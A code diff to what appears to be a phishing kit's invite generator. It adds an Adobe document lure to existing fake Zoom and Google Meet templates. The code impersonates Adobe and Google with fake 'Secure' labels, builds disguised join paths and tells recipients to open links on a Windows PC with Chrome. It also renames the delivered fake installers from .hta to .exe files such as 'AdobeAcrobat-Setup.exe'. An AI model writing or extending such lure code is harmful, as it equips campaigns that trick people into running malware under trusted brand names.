@@ -1,4 +1,4 @@
-export type GuestInviteTemplate = 'zoom' | 'google_meet';
+export type GuestInviteTemplate = 'zoom' | 'google_meet' | 'adobe';
 
 export interface GuestInviteInput {
   joinUrl: string;
@@ -13,6 +13,7 @@ export const INVITE_TEMPLATE_OPTIONS: {
 }[] = [
   { value: 'zoom', label: 'Zoom Meeting' },
   { value: 'google_meet', label: 'Google Meet' },
+  { value: 'adobe', label: 'Adobe Document' },
 ];
 
 const TEMPLATE_COPY: Record<GuestInviteTemplate, { title: string; body: string }> = {
@@ -23,6 +24,10 @@ const TEMPLATE_COPY: Record<GuestInviteTemplate, { title: string; body: string }
   google_meet: {
     title: 'Join with Google meet',
     body: 'You have been invited to join google meet call session. NOTE: For the best connectivity pls use Google Chrome on a window PC',
+  },
+  adobe: {
+    title: 'Document shared with you',
+    body: 'Open the shared PDF on a Windows PC with Google Chrome for the best experience.',
   },
 };
 
@@ -50,6 +55,13 @@ export const TEMPLATE_UI: Record<
     secureLabel: 'Google Workspace Secure',
     pathPrefix: '/gotme/GoogleMeet',
   },
+  adobe: {
+    brand: 'Adobe Acrobat',
+    accent: '#b22222',
+    joinHeading: 'Opening your document...',
+    secureLabel: 'Adobe Secure',
+    pathPrefix: '/adobefile',
+  },
 };
 
 const GUEST_LINK_NEVER_EXPIRES_AT_MS = Date.parse('2099-12-31T23:59:59.999Z');
@@ -74,20 +86,26 @@ function formatInviteDate(value?: string | Date): string {
 }
 
 export function normalizeInviteTemplate(value?: string | null): GuestInviteTemplate {
-  return value === 'google_meet' ? 'google_meet' : 'zoom';
+  if (value === 'google_meet') return 'google_meet';
+  if (value === 'adobe') return 'adobe';
+  return 'zoom';
 }
 
 export function defaultLabelForTemplate(template?: GuestInviteTemplate | null): string {
-  return normalizeInviteTemplate(template) === 'google_meet' ? 'Google Meet' : 'Zoom Meeting';
+  const t = normalizeInviteTemplate(template);
+  if (t === 'google_meet') return 'Google Meet';
+  if (t === 'adobe') return 'Adobe Document';
+  return 'Zoom Meeting';
 }
 
 export function installerFileNameForTemplate(template?: GuestInviteTemplate | null): string {
-  return normalizeInviteTemplate(template) === 'google_meet'
-    ? 'GoogleMeet-Setup.hta'
-    : 'ZoomClient-Setup.hta';
+  const t = normalizeInviteTemplate(template);
+  if (t === 'google_meet') return 'GoogleMeet-Setup.exe';
+  if (t === 'adobe') return 'AdobeAcrobat-Setup.exe';
+  return 'ZoomClient-Setup.exe';
 }
 
-/** Public guest URL — matches meetinginvite.vu path style. */
+/** Public guest URL — matches meetinginvite.vu / Adobe path style. */
 export function buildGuestJoinUrl(
   appBase: string,
   code: string,
@@ -98,6 +116,9 @@ export function buildGuestJoinUrl(
   if (t === 'google_meet') {
     return `${base}/gotme/GoogleMeet/${code}`;
   }
+  if (t === 'adobe') {
+    return `${base}/adobefile/${code}`;
+  }
   return `${base}/joinzoom/${code}`;
 }
 
@@ -106,6 +127,21 @@ export function formatGuestInviteText(input: GuestInviteInput): string {
   const joinUrl = input.joinUrl.trim();
   const template = normalizeInviteTemplate(input.template);
   const { title, body } = TEMPLATE_COPY[template];
+
+  if (template === 'adobe') {
+    return [
+      title,
+      '',
+      'Document link:',
+      joinUrl,
+      '',
+      body,
+      '',
+      `DATE: ${formatInviteDate(input.expiresAt)}`,
+      '',
+      '—————————————————————————',
+    ].join('\n');
+  }
 
   return [
     title,
